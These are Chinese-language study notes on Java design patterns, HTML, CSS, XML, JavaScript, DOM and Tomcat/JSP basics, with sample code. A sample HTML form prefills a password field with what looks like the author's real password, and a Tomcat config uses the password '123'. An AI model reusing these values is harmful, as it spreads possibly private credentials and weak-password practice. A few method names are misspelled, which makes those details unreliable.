	public class singleTon
	{
		public int a;
		private singleTon() //创建private构造器，防止JDK自己创建构造器
		{
		}
>
		private static singleTon h=new singleTon(); //创建static field，用于缓存创建的单例对象，同时检测是否单例。
>	
		public static singleTon f() //创建static方法，以创建单例对象，返回该对象引用。
		{
			return h;
	    }
		public static void main(String[] args)
		{
			System.out.println(singleTon.f().a); //使用static单例对象创建方法来创建单例。
		}
>		
		{
			a=10;
		}
	}


##工厂模式
`Factory`模式
当我们的程序中需要多种类对象的时候，可以创建一个`Factory`类，专门用于创建类对象。这些类具有相同的特性，都实现了某一个接口，然后面向接口编程。即可实现工厂模式。

##观察者模式
`Observer`模式：是对象的行为模式，又称为发布-订阅模式(`Public/Subscribe`),源-监听模式(`Source/Lisetener`)模式。  

`AWT/Swing`的事件处理中使用了观察者模式。使用了委托事件模型：对事件的处理并不是由事件源本身去处理的，而是委托交由其它的对象进行处理。

几个概念：  
1. 事件源：产生事件的源头。事件发生的目的对象。也即是**被观察者**  
2. 事件对象：封装了事件的详细信息的对象。  
3. 事件处理者:对事件的处理并不是由事件源本身完成的，而是委托事件处理者进行处理的。也就是**观察者**，观察者可以有多个。  
事件处理者能处理事件的前提是：事件处理者(观察者)在事件源(被观察者)那里进行过注册。

观察者模式定义了一个一对多的依赖关系，让一个或多个观察者对象监视一个呗观察者。  
这样，当一个被观察者在状态上的变化能够通知所有的依赖与该被观察者对象的那些观察者对象的时候，这些观察者对象就能够对此做出反应。

观察者模式示例如下：  
a.被观察者：
>
	package com.trilever;
	import java.util.LinkedList;
	import java.util.List;
	public class Arvil
	{
		//事件本身
		Event e = new Event();
		List<Iboy> Iboys = new LinkedList<>();
		//注册观察者
		public void addListenner()
		{
			Iboys.add(new Jim());
			Iboys.add(new Lilei());
		}
		//产生事件
		public void setEvent(int i)
		{
			e.happy=i;
		}
		public List<Iboy> getBoys()
		{
			return Iboys;
		}
	}
	
b. 观察者接口，因为一个被观察者可以被多个观察者观察。
>
	package com.trilever;
	//观察者接口，相当于Swing中的ActionListenner接口，我们需要使用匿名内部类来获得这个ActionListenner接口的实例对象
	public interface Iboy
	{
		public void makeHappy(Event e);
	}

c. 观察者1
>
	package com.trilever;
	//实际观察者1
	public class Jim implements Iboy
	{
		@Override
		public void makeHappy(Event e)
		{
			switch (e.happy)
			{
			case 0:
				System.out.println("jim0");
				break;
>	
			case 1:
				System.out.println("jim1");
				break;
>	
			case 2:
				System.out.println("jim2");
				break;
>	
			default:
				break;
			}
		}
	}

d. 观察者2
>
	package com.trilever;
	//观察者2
	public class Lilei implements Iboy
	{
		@Override
		public void makeHappy(Event e)
		{
			switch (e.happy)
			{
			case 0:
				System.out.println("lilei0");
				break;
>	
			case 1:
				System.out.println("lilei1");
				break;
>	
			case 2:
				System.out.println("lilei2");
				break;
>	
			default:
				break;
			}
		}
	}

e. 事件：
>
	package com.trilever;
	//事件对象，对事件的封装，目的是提供给观察者。
	public class Event
	{
		int happy = 0;
		public void setHappy(int i)
		{
			this.happy = i;
		}
	}

f. 测试类：
>
	package com.trilever;
	//测试类
	public class ObserverLTest
	{
		public static void main(String[] args)
		{
			Arvil a = new Arvil();
			a.addListenner();
			a.setEvent(2);
			for (Iboy i : a.getBoys())
			{
				i.makeHappy(a.e);
			}
		}
	}


##适配器模式
当我们的接口中有很多个方法的时候，我们在实现这个接口时，会需要实现所有的这写方法，这样才不至于创建一个`Abstract`类。但是，这些方法并不是都有用的，全部实现是一种浪费。  
所以，有鉴于此，我们先写一个`Adapter`类，这个类对接口中所有的方法都予以实现，不过都是空实现，然后当我们需要使用这个接口的时候，直接继承这个`Adapter`类即可。继承这个`Adapter`类时，只需要对自己想要的方法于是重写，而不必重构写所有的方法。

在`AWT`编程中即使用了`Adapter`模式。

#HTML
##基础知识
开发`B/S`应用的技术：  
`asp`(过时了)，`php`，`jsp`，`asp.net`。这些都是在服务器端使用的开发`B/S`架构网站的技术。  
服务器端无论是使用哪一种技术，在浏览器端都是运行解析的都是`HTML`代码(当然其中包括嵌入的`JS`代码与`CSS`代码。`HTML`是基础根本。  
`HTML`也是一种规范。`HTML5`功能强大，属于`web2.0`。其是一种解释执行的语言。

`B/S`技术的原理：  
当我们向`Web`服务器发出请求之后，`Web`服务器就会向我们的浏览器发送一个很长的字符串，也就是`HTML`代码。接收到这个`HTML`文档之后，我们的浏览器就解析使用这个`HTML`代码。

由于`HTML`语言的语法不够规范，所以出现了`XML`语言，以避免其劣势。但仍未代替`HTML`。  
目前`XML`的主要作用依旧是*写配置文件*，例如、在服务器端的`Servlet`中就需要配置`XML`文件，在`Andriod`代码中使用`XML`文件来描述试图组件。  
目前`HTML`进化为`XHTML=HTML+部分的XML`。  

**重点**：任何一种标记语言，基本上标记都是成双成对出现的。*每一对标记表示一个对象*，放在这个标记括号里面的东西，例如：`border`、`name`这些都是表示这一对标记所代表的*对象的属性*，就好比面向对象语言里面的对象与属性的关系一样。
示例如下：
>
	<table border=1>
	</table>

这一对标记表示一个**表格对象**，里面的`border`表示这个`table`的属性，就是边框的大小。

一个`HTML`文档的示例如下：
>
	<html>
	<head>
			<title>biaoti</title>
	</head>
	<body>
			zhengwen
	</body>
	</html>

`html`标记表示一个网页文档对象，`head`标记表示文档的头部，`body`标记表示文档的正文部分。这些对象都没有写属性。  
一对标记放在另一对标记里面，表示一个对象放在另外一个对象里面，就是包含的关系，不是表示一个对象的属性，而是表示一个对象是另一个对象的一部分。  
就好比，在`Java`中，类与类的关系：继承(`is a`)，属性(`has a`。一个类是另一个类的属性，表示一种描述，班级与班级名称即是如此关系)，包含(`own a`。内部类，表示内部类是外部类的一个部分，而不是一个属性，如，学生与班级的关系即是如此)。  
`HTML`标记语言里不区分大、小写。

##HTML中常用标记：  
`<html bgcolor="red" background="背景图片"></html>`:表示这是一个网页文档对象。  
`&nbsp`：表示一个空格。  
`<p></p>`:表示一个段落。段落前后有空行。  
`<br>`:换行。  
`<hr width="100" align="left">`:表示一条线，括号里的内容表示线的属性。这里的线长是绝对的，如果写作`"100%"`表示这里线长是相对的。  
注意：所有的属性值都用引号括起来，写成字符串的形式。  
`<h1~6></h1~6>`:这个标记表示这里是一个`body`段中的标题对象。  
`<ol type="I"></ol>`:表示一个列表。有序的。大写罗马数字表示。  
`<ul></ul>`:无序列表对象  
`<li></li>`:表示列表中的每一项对象。  
`<img src="地址" alt="提示">`:表示一个图片对象。当图片无法显示的时候，就会显示`alt`中的提示。  
`<a href="目标地址">显示的文字</a>`：`<a></a>`表示一个超链接对象。  
还可以使用*邮件链接*。写法：`<a href="mailto:目标地址"></a>`  
还有锚点链接。也是使用`<a></a>`标记。写法：`<a name="第三章"></a>`  
热点链接：就是将图片上的某个区域设为链接。  

也可以在一个对象中套另外一个对象。  
例如，在一个超链接对象里面套一个图片对象，这样就可以在点击图片的时候启动链接。  
再例如，在`html`对象里面可以包含`head`对象与`body`对象。  

`<META http-equiv="refresh" content="5";url=test.html>`标记，作用：告诉浏览器的一些例如默认字符集等内容。  
例如：本标记的含义是自动刷新跳转到`test.html`页面。总之，`meta`标记很有用  
`<Marquee>滚动的文字</Marquee>`：该标记表示滚动的文字或者图片。  

**注意**:那么哪种标记是一对的，哪种是一个的？  
`Answer`:当这个标记的对象要显示出文字或者图片的时候，就是一对的，中间放的是要显示的东西。如，链接对象上要显示出内容，所以是一对的。线条`hr`标记对象不用显示出东西，所以是一个的。`img`图片标记不用显示出文字内容，所以是一个的。

##表单
`HTML`页面的作用：显示与接收数据。用以与用户进行交互。  
在`HTML`页面中，存在表单(`Form`)，表单的作用就是：里面放置各种**输入控件**，以**接收用户的输入**。  
`<form></form>`:该标记表示一个表单对象。里面放的是各种控件。  
表单的属性有：  
1. `name`：表示表单的名字  
2. `action`：请求处理的目的地址(服务器端的处理页面地址) 
3. `method`：默认值有`get/post`，表示两种提交方式。`get`请求会在浏览器地址栏显示*请求内容*，而`post`请求不会显示。所以对于敏感信息的提交要使用`post`请求。默认是`get`请求。  

输入控件的种类：单行、多行、密码、单选、多选、下拉输入、提交按钮、重置按钮等。*控件对象是放在表单对象里面的*  

表单及输入控件的使用示例：  
>
	<form name="save stu" action="save_Stu.jsp" method="get">
	账号：<input name="账号" width="20" type="text" maxlength="10"  value="trilever"/>
	<br />
	密码：<input name="密码" width="20" type="password" value="wt312041990" maxlength="10" />
	<br />
	描述：<textArea rows="10" cols="10" style="background-attachment:fixed"  name="描述" >Great
	</textArea>
	<br />
	<input name="submit" type="submit"  value="Submit" size="10" />
	<input name="reset"  type="reset" value="Reset" size="10" />
	<br />
	<input name="sex"  type="radio"  checked="checked"/>Male
	<input name="sex"  type="radio"/>Female
	<br />
	<input name="a"  type="checkbox" />a
	<input name="b"  type="checkbox" />b
	<input name="c"  type="checkbox" />c
	<input name="d"  type="checkbox" />d
	<br />
	下拉<select name="city" size="3" multiple="multiple">
		<option value="北京">北京</option>
	    <option value="上海" selected="selected">上海</option>
	    <option value="广州">广州</option>
	    </select>
	<br />
	<button>按钮</button>
	</form>

控件`Readonly`属性：只读，依然可以获得焦点，可以提交。
控件`disabled`属性：无法获取焦点，也不会提交数据。  
在网页里面，还有一种图像提交域，可以通过其提交图像。  

表单隐藏域：也就是暗数据。  
就是在表单提交中，即使用户自己没有提交，依旧自动提交了这个域。  
##表格  
`<table></table>`:  
`table`里面放置的是表格内容及表名等内容:  
`<th></th>`里面放置的是表格的表头。其放置在`<tr></tr>`里面。  
`<tr></tr>`里面放的是行。  
`<tb></tb>`里面放的是列，其放置在`<tr></tr>`里面。  
`<caption></caption>`:表示的是表名。  
表格的作用：  
1. 将数据进行格式化显示。  
2. 对`HTML`中的各种元素对象进行定位、布局。  

网页设计中使用`table`进行元素的定位、布局，以前做网页使用大量的`table`进行定位与布局，现在改为使用大量的`div`。  
怎样使用`div`进行定位、布局？  
`Answer`:将网页原型中的每一块写成一个`div`，然后使用`CSS`或者直接使用`div`的属性确定这个`div`块放置在网页的那一个区域即可。  
定位思想：  
方法1. 画出一个大表格，然后依据自己想要的内容，对大表格进行细分。  
方法2. 将表格进行足够的细分，然后按照自己的需要，对小的格子进行合并。  
表格使用示例:
>
	<table height="145" border="1">
		<caption>biaoge</caption>
		<tr>
	    	<th width="78">Name</th>
	        <th width="73">Age</th>
	    </tr>
		<tr>
	    	<td width="78">1</td>
	        <td width="73">2</td>
	    </tr>
	    <tr>
	    	<td>3</td>
	        <td>4</td>
	    </tr>
	</table>

##网站布局及框架
网页一般分为4个部分：`top`、`left`：导航栏、`main`：主内容部分、`foot`：版权声明。  

当某网站设计有多个网页的时候，各个网页的`top`、`left`部分都是不变的，当网页跳转的时候，如果各个部分都要加载，就会导致降低效率，所以要使用框架，使`top`、`left`这些部分的内容可供共用。网页跳转的时候不用全部都重新加载一遍。  

框架技术就是将一个网页分割成几个网页窗口，每个窗口中显示一个网页文件。当窗口不能完全显示网页的时候，可以通过滚动条来显示被隐藏的部分。其目的是增强网页的导航功能。  

框架的构成：一个框架是有几个网页文件构成，其中一个网页文件专门负责框架设置，这个网页文件叫做**框架组**。其他的网页文件叫做**框架页**，框架页被放在到框架组中来显示。  
`<frameset></frameset>`标签。表示包含若干个框架页的框架。该标签放在框架组中。  
`<frame></frame>`标签。表示一个框架页。该标签  

框架的使用：先写出各个部分的页面，如、`top`部分写一个框架页面，`left`部分写一个框架页面……，然后写一个框架组`index`页面，再在`index`页面中加入代码将这几个框架页面添加上去。可以进行框架之间的嵌套。  
还有一种内联框架:`<iframe></iframe>`，就是在一个页面中新建一个层，然后将另一个页面作为内联框架嵌入到这个层上面即可。就是在一个页面中开辟一块区域放置另一个页面。
框架的使用示例：  
`head`部分代码：  
>
	<!doctype html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>Head</title>
	</head>
>	
	<body bgcolor="#66CCCC">
		This is  the head
	</body>
	</html>

`left`部分代码：  
>
	<!doctype html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>left</title>
	</head>
>	
	<body bgcolor="#CC6666">
	this is the left
	</body>
	</html>

`main`部分代码：  
>
	<!doctype html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>main</title>
	</head>
>	
	<body bgcolor="#00FF00">
	this is the main
	</body>
	</html>

`foot`部分代码：  
>
	<!doctype html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>foot</title>
	</head>
>	
	<body bgcolor="#9900FF">
	this is the foot
	</body>
	</html>
	
`index`部分代码：  
>
	<!doctype html>
	<html>
	<head>
	<meta charset="utf-8">
	<title>index</title>
	</head>
>	
	<body>
	<frameset rows="20%, 60%, 20%">
		<frame src="/head.html"
	    />
	    <frameset cols="30%,70%">
	    	<frame src="/left.html"
	        />
	        <frame src="/main.html"
	        />
	     </frameset>
	   <frame src="/foot.html"
	   />
	</frameset>
	</body>
	</html>

注：`Ajax`继续可以很好实现框架的技术，所以完全可以使用`Ajax`代替框架。

##HTML中的DIV层  
如果将`html`比做`C/S`中`Frame`(窗体)，`DIV`就是窗体中的面板(`Panel`)。  
`DIV`层的作用：更好管理上面的空间，为权限管理提供更好的支持。  
`DIV`层在`HTML`中相当于`Java`中的`Panel`。就是可以放置其他元素的构件。  
实际上，单纯的`DIV`层不能改变大小，`apDiv`层可以改变大小，这就是二者的不同。  

##HTML中的CSS  
`HTML`中放置的是要显示的内容，`CSS`控制内容的显示风格，如、字体、颜色等，`JS`控制的是动作、行为等。  
怎样对`HTML`中的元素对象应用我们已经设置好的`CSS`？  
`Answer`：将`HTML`中的元素对象的`class`属性设置为`CSS`样式表的名字即可。  
`CSS`一般放置在`head`标签之间，供`body`标签之间的内容调用。

依据`CSS`所在位置，`CSS`样式分为：  
1. 行内样式:不单独写`CSS`样式代码，而是在元素对象的属性中使用`style`属性进行设置，放置在元素对象中，控制这个元素对象的显示。其缺点是：内容与`CSS`部分混在一起，混乱且不利于复用。  
2. 行外样式：在`head`部分单独写`CSS`样式代码。然后在要显示的元素对象中使用`class`属性即可。行外样式有利于`CSS`代码复用。  
注：不要使用行内样式。  

实际中，我们更多的将所有的`CSS`样式提取出来，做成一个`CSS`样式表，然后在`HTML`文档中不放置样式表，而是在某个元素对象要使用某个样式表的时候，直接使用这个`CSS`样式表中的`CSS`样式(当然在`HTML`文档中需要进行一次导包导入这个`CSS`样式表即可)。

依据`CSS`的命名可以分为：  
1. 类选择器样式：通过元素对象的`class`属性来进行使用。`CSS`样式的名字前面有"."。  
2. 上下文样式：如果使用类选择器，当`HTML`中要使用某一个样式的元素对象过多，那么都使用`class`属性就过于麻烦。这时就需要使用上下文样式。其通过与某一个元素对象进行挂钩，每次创建一个该元素对象的时候，就会自动使用该上下文样式。该`CSS`样式的名字前面没有".",名称个数有限，与标签样式相同。不用通过`class`属性来加载、使用样式。  
3. 链接样式：超链接有4种状态,未访问、已访问、鼠标放上去、鼠标按上去。当我们希望对于一个链接的不同状态体现出样式的时候，就可以使用链接样式。对于不同状态链接都设置器不同的显示样式。  
4. ID选择器：针对某一个`ID`的元素对象使用，通过元素对象的`ID`属性进行使用。名字前面有"#",`ID`属性主要用于后期的客户端编程而设置的(`JS`)，主要用于`DIV`层。尽量少用。  

`CSS`样式表示例：
>	
	<style type="text/css">
	body,td,th {
		color: #D6D6D6;
		background-color: #0F0;
	}
	body {
		background-color: #C00;
	}
	.mudiv {
		background-color:#000;
	}
	\#apDiv1 {
		position: absolute;
		width: 200px;
		height: 115px;
		z-index: 1;
		left: 147px;
		top: 293px;
		background-color: #0FF;
	}
	.table {
		background-color: #099;
	}

#Java中的XML
--------------
数据存储的几种方式：  
1. 键值对形式，`name："li"`  
2. `XML`描述  
3. 数据库，可以存储数据和操作数据  
数据量比较大的时候，使用数据库。
扩展性(`Extended`)标识语言，用于标识描述数据信息。其是`SGML`标识语言的简化。  
再，由于`HTML`语言的语法不够严谨，所以在`HTML`4.0.1版本之后，将其过渡至`XHTML`(扩展性`Extended`）语言,`XHTML`更加严谨、规范。`XHTML`可以理解为是`HTML`向`XML`语言过渡的中间产物。  

`HTML`与`XML`之间的区别在于：  
1. `HTML`是固定标识，只能写它能识别的标识。`XML`中的标签可以自由定义。  
2. `HTML`较为随意，`XML`很严谨。  
3. `HTML`将数据和其显示结合在一起，不方便对数据进行操作。`XML`将数据与其显示分开，纯粹对数据进行描述。数据描述是数据描述，显示是显示。

`XML`的好处：  
1. 结构严谨，规范。  
2. 是标准的数据交换文件，已用于通用的配置信息文件。  
3. 结构简单，便于书写，增强阅读性。  
4. 将数据进行结构化，是数据之间具有明确的层次关系。

`XML`文档示例：  
>
	<?xml version="1.0"?>
	<students>
		<student>
			<name>zhangsan</name>
			<age>20</age>
		</student>
>		
		<student>
			<name>lisi</name>
			<age>22</age>
		</student>
>		
		<student>
			<name>wangwu</name>
			<age>21</age>
		</student>
>		
		<student>
			<name>zhaoliu</name>
			<age>23</age>
		</student>
	</students>
 
`XML`文档中**只能有一个顶层元素**。如上面的`<students>`这个元素，也叫根元素。也就是最外层的标签，只能有一个。

`CDATA`区：当我们的文档中，某一段数据不想被解析，只希望作为单纯的字符而已。那么，可以将这段字符放在`CDATA`区，放在`<![CDATA[ *数据* ]]>`标签里面。这样，里面的数据就能够不解析，而是作为单纯的字符。  

`XML`中所有标记的属性值必须用""或者''括起来。  

`XML`中名字可以使用字母、数字、中文（需要在`XML`声明的时候知道`encoding`属性)



#JavaScript
-----
##JavaScript基础知识
基于对象，并未完全满足面向对象三个特征。但是有类与对象的概念。  
是一种弱语言：可以不声明变量类型。声明变量用`var`修饰符。区分大小写。解释执行。  
脚本语言。  
作用：用于客户端编程。用于在浏览器中执行。最多的用于在客户端验证、各种特效、为`Ajax`提高支持。  

`Java`、`JSP Servelet`、`PHP`代码都在服务器端运行，他们都在`Tomcat`等这些服务器容器中被编译运行后产生了`HTML`、`JS`、`CSS`代码，然后发送给客户端浏览器进行执行。  
`SQL`脚本在数据库中被执行。  
`JS`代码放在在`HTML`中哪儿都可以，如果是前台，最好放`HTML`最后面。如果是是后台，随便放哪里都可以。最好放在`head`标签中。  
`JS`代码在客户端完全是可以被抓取到的，因为要被服务器端完全的发送给浏览器，由浏览器对这些`JS`代码进行解释执行。只要你写出来就可以被人看到。
`JS`代码中带有`HTML`代码也可以被解析。声明变量全部使用`var`，可以将`var`理解为`object`。  

内置对象：`document`代表整个网页，`alert`等。  
`parseInt()`方法：将字符串转换为数字。  


##JavaScript中的Function
方法都是通过事件进行调用的，当事件发生之后，就会调用方法。如，`onload`事件、`onclick`事件。都可以用于激发事件。  
方法同样可以`return`数据，方法的返回值可以用于显示、初始化其他变量等等。但是不同的是，方法的声明中无需写返回值类型。  
方法的参数列表中也无需写数据类型。只需参数名称。  

注意：如果一个内容是使用双引号("")括起来,那么这个内容中的所有需要使用""的地方都要改成''才可以。  

`JS`基础语法使用示例：  
>
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<title>无标题文档</title>
	<script type="text/javascript">
		document.writeln("hi")
		var name = "how are you?"
		document.writeln("hi"+name);
		alert("great");
		function test()
		{
			alert("ni");
		}
		function test1()
		{
			return "thank you ";
		}
		function test2(a)
		{
			var str = test1();
			alert(str);
			alert(a);
		}
	</script>
	</head>
	<body onload="test()">
	<input type="button" onclick="test2('good')" />
	</body>
	</html>

注意理解`JS`中的对象模型：  
以下为示例：
`document`代表整个网页，那么`document.Cal`就表示这个网页中的Form这个表单对象。`document.Cal.document.Cal.Num1`代表这个表单中的`Text`框对象本身。`document.Cal.document.Cal.Num1.value`代表`Text`框对象中的值。我们可以在`Script`中的方法中修改对象中的值。`Form`对象的`name`就相当于`Java`中对象实例的名字一样，`Form`对象中包含的`Text`框对象的名字相当与`Java`中的类的内部类对象的名字一样的。
>	
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
	<meta http-equiv="description" content="The Calculator designed by trilever"/>
	<title>Calculator</title>
	<script type="text/javascript">
		function f(v)
		{
			var s1=parseFloat(document.Cal.Num1.value);
			var s2=parseFloat(document.Cal.Num2.value);
			var rst;
			if(checkData()==false)
			{
				return;
			}
>			
			switch (v)
			{
				case "+":
				{
					rst=(s1+s2);
					break;
				}
				case "-":
				{
					rst=(s1-s2);
					break;
				}
				case "*":
				{
					rst=(s1*s2);
					break;
				}
				case "/":
				{
					rst=(s1/s2);
					checkData("/");
					break;
				}
				case "%":
				{
					rst=(s1%s2);
					break;
				}
			}
			document.Cal.rst.value=rst;
		}
		function checkData(v)
		{
			if(document.Cal.Num1.value == "")
			{
				alert ("第一个数不能是空");
				return false;
			}
			if(document.Cal.Num2.value == "")
			{
				alert ("第二个数不能是空");
				return false;
			}
			if(isNaN(document.Cal.Num1.value))
			{
				alert ("第一个数不是数字");
				return false;
			}
			if(isNaN(document.Cal.Num2.value))
			{
				alert ("第二个数不是数字");
				return false;
			}
			if(v=="/"&&document.Cal.Num2.value==0)
			{
				alert("被除数不能为零")
				return false;
			}
			return true;
		}
	</script>
	</head>
>
	<body>
		<form name="Cal"/>
	    Num1:<input type="text" name="Num1"/><br/>
	    Num2:<input type="text" name="Num2"/><br/>
	    Result:<input type="text" value="" name="rst"/><br />
	    <input type="button" name="jia" value="+" onclick= "f('+')"/>
	    <input type="button" name="jian" value="-" onclick= "f('-')"/>
	    <input type="button" name="cheng" value="*" onclick= "f('*')"/>
	    <input type="button" name="chu" value="/" onclick= "f('/')"/>
	    <input type="button" name="yu" value="%" onclick= "f('%')"/>
	    </form>
	</body>
	</html>
##JavaScript中的常用对象
###String对象
####String对象的方法
`charAt();`
`indexOf();`…… 等与Java中的String类对象的方法差不多。
###Date对象
`Date`对象表示一个日期对象。  
	var date = new Date();

####Date对象的方法
	getsecond();

###数组
创建数组：  
	var arr = new Array(3);或者
	var arr = new Array("aa","bb","cc");
###数组常用方法
	join():将数组中的内容联接成字符串。  
	reverse()：将数组中的内容反转。  
	sort()：对数组宏的内容进行排序。  

思考一个问题？  
`Java`中，类的成员变量到底代表了什么？只是表示这个类的某些属性用于描述这个类(由这个类产生的类对象)的性质？类的方法到底是做什么用的？是不是只是为了对这个类的属性进行操作从而使整个类(对象)体现出不同的属性。  
`Java`中的类的内部类到底是代表了什么？是不是代表了这个类内部所拥有的细分的零件部分。这个内部类与外部类的方法之间的关系是什么样的？是不是外部类的方法可以修改内部类创建的对象的属性。也就是说，人体这个外部类可以修改手这个内部类对象的属性？

##JS中的内置对象 
`JavaScript`中区分大小写。
所谓的内置对象，就是不需要声明不需要创建，可以直接使用。内置对象全部为`JS`关键字。
###window对象  
其代表了整个窗体，其包含了`HTML`部分(`Document`对象)。所谓的`HTML`部分就是用`Document`对象表示。  
`window`对象如图`window_Structure.png`所示：  

如，`alert()方法`、`isNanN()方法`、`confirm()`都是该对象的方法，可以不使用对象而是直接使用这些方法。
以下都是`window`对象所具有的方法与内部对象：

`confirm()`：显示一个对话框。  

`open("url","name")`:打开一个新页面、窗体。  

`showModalDialog()`:显示模式窗口。所谓的模式窗口就是让这个窗口永远获得焦点，在其被关闭之前。  

`close()`：关闭当前窗体。  

`window.screen`对象：是`window`的内置对象。表示客户端屏幕以及显示性能。  

`window.status`对象：也是`window`的内置对象。表示浏览器状态栏中显示的内容。  

`window.history`对象：表示客户访问果的`url`信息。该对象有3个方法：`back()`、`forward()`、`go(var indiex)`  

`window.location`对象：表示当前的`url`信息。该对象的一个内部对象`window.location.href`表示一个新的页面。例：`window.location.href = "目标url";`实现跳转到目标`url`。  

`window.document`对象：实际上表示浏览器窗口`window`对象中包含的`HTML`文档部分。该对象所拥有的方法如下：  
`write()`：向浏览器页面的`body`部分写入内容。  
`getElementById()`:获得`HTML`文档中的某一对象，如一个`Button`、一个`Div`亦可。这个方法及其有用，因为获得这个文档中的对象之后，就可以调用这个对象的方法，获得对象的属性还可以修改对象的属性，全都可以。
`getElementByName()`：通过文档中对象名字获得对象本身。和上面的一样。
`getElementsByName()`：获得多个对象。  
`getElementByTagName()`；通过对象的标签类型获得对象。  
`createElement("element name")`:创建一个新的节点对象。 

##JS中的DOM编程
`DOM:Docuement Object Model`,文档对象模型。就是说，可以将整个`HTML`文档视为一棵`DOM`树。
`DOM`树见图`DOM_Structure.png`所示：  

`DOM`编程就是为了动态地(在代码运行之后)给文档(**DOM树**)添加或删除一些节点，或者得到、修改节点的属性值。  
`DOM`编程的优点就是：可以动态地改变`HTML`文档中原有的内容。这样就可以与`JS`进行结合通过一些动作动态修改文档中的内容。修改显示的对象页面。`DOM`是`JS`可变的基础。  

注意：一个标记就是一个节点。  
我们可以将`DOM`中的每一个节点理解为一个类对象。但一般只考虑类对象的属性。他们有一个共同的父类`Node`。如`img`、`button`标签都共同继承自`Node`类。类似于`Java`中每一个类都继承自`Object`类。  

由于子类拥有父类的属性与方法，只要知道`Node`类的属性与方法，那么就可以调用所有`HTML`节点的属性与方法。`HTML`文档中各个节点对象都具有属性与方法。  
例如：对于一个`button`节点而言，其自`Node`节点继承了`firstchild`属性，那么通过`button`的`firstchild`属性返回了该`button`的第一个子节点。

`event`对象：是事件对象。其也是内置对象。表示发生的某个事件。其具有两个属性：`keyCode`属性表示当前的按键编码。`srcElement`表示在哪一个控件中产生的该事件。`this`表示本控件。  

添加链接节点的时候，需要用一个文本将整个链接显示出来。这时就需要添加一个文本节点，添加一个链接节点，然后将文本节点加到链接节点对象中，再将链接节点对象添加到别的节点对象中。
#Java Web
-----
所谓的`Java Web`  就是用`Java`做网站。  
动态网站：能与数据库进行交换的网站。  
`WebServer`：就是用来运行`WebApp`应用程序的服务器。
技术流派如下：  
1. `JSP`网站空间贵，`ASP`技术已经淘汰，但是空间便宜。  
2. `PHP`语法借鉴了`C`、`Java`等语言，装在`Apache`服务器上，语言简单，开发简单。功能没有`Java`、`.Net`强大。做超大型项目还是不行。依赖于`Apache`服务器。
注意：`Apache`服务器是一种服务器，`TomCat`服务器也是一种服务器，二者平级。但是两种服务器可以进行整合，是的`TomCat`服务器可以使用`Apache`服务器的功能。
3. `JSP/Servelet`:学习`Java`语言做`B/S`的技术。学习`Java`做`C/S`的技术就是`AWT/Swing`。  
4. `ASP.NET`:就是`ASP`的升级版，这就是学习`C#`语言做`B/S`的技术，学习`C#`做`C/S`的技术就是`winforms`。微软的技术特点就是什么事都帮你做好，具体内部实行的细节保密不会告诉你。`Java`的技术特点就是告诉你方向，细节部分都得自己去做细节部分可以暴露出来，所以`Java`内部的东西都是可控的，任何东西都是自己明白的。`ASP.net`必须运行在`IIS`服务器上，但`IIS`依赖于服务器。
不要去那种小做网站的公司工作。  

#JSP/Servlet
----
##基础知识
`JSP/Servlet`是`SUN`制定的用`Java`开发`Web`应用程序的规范。  
`JSP`规范是建立在`Servelet`规范之上的。先有`Servelet`,后有`JSP`。  
`Servlet`：是一个可以部署到`WebServer`服务器上的可以供客户端访问、处理客户端请求的`Java`类。  
`JSP`：文件后缀`jsp`，`JSP`页面=`DHTML(HTML+CSS+JS)+Java`。该页面转译后就是一个`Servlet`。  
我们要做的事：依据`JSP/Servlet`这个规范开发出应用组件(就是`Web`应用程序)，然后将这组件放在容器中(`Tomcat`)，让其运行。供客户端访问调用我们写的程序。

##`TomCat`的配置
`config`目录下的`Server.XML`文件用于配置`TomCat`端口号。  
其`TomCat User.XML`文件用于配置登陆用户的账号等信息。在`TomCat`中添加账号的时候，不但要添加用户还需要添加角色。  
如下：  
>
	<role rolename="manager-gui"/>
    <user password="123" roles="manager-gui" username="trilever"/>

使用`MyElipse`插件进行`Web`应用开发，其是`Eclipse`的插件。
一个`Web`服务器中可以放有多个应用程序项目。一个应用程序项目中可以有多个`Servelet`，各个`Servelet`负责不同的任务。
要学会`TomCat`的自动部署和手动部署。  
手动部署：就是将你自己创建的`Web`项目中的`WebRoot`目录下的文件全部复制到`TomCat`的`WebApps`目录下与项目同名的文件夹中(要在`WebApps`目录下先建立一个与项目同名的文件夹才可以，然后将那些文件复制进去)。
自动部署：`IDE`会自动将手动部署的复制这些步骤全部自动完成。
我们自己写代码都是写在我们项目的文件夹中，而不是在`TomCat`的目录中。但是如果是放在项目的`WebRoot`目录下，就会自动被同步到`TomCat`的`WebApps`目录下面。

注：`JSP`页面就是`HTML+Java`。其页面中包含这两种代码。在运行的时候，会自动将`JSP`代码转化为`Servlet`进行运行。  

##Servlet
###基础知识
其本质就是一个特殊的`Java`类。
`Servlet`类的继承结构如图`Servlet_Inherit_Structure.png`所示：  

其实例的创建(`new`)、销毁都是由容器完成的，而不需要人工手动执行(一般的类都需要人工手动创建实例)。
`Servlet`类与普通类的区别见图`Servlet_With_Ordinary_Class.png`所示：  
###Servlet生命周期
所谓的`Servlet`类对象的生命周期：就是指一个`Servlet`类对象创建(由`Web`容器`Tomcat`完成)到消亡的整个过程。  
`Servlet`类生命周期见图`Servlet_Life_Period1.png`、`Servlet_Life_Period2.png`所示：  

由于我们自己创建的`Servlet`类继承自`HttpServlet`类，也就是说继承了`server(……)`方法、`init(……)`方法、`destory()`方法。  
`HttpServlet`类的生命周期见图`HttpServlet_Life_Period.png`所示：  

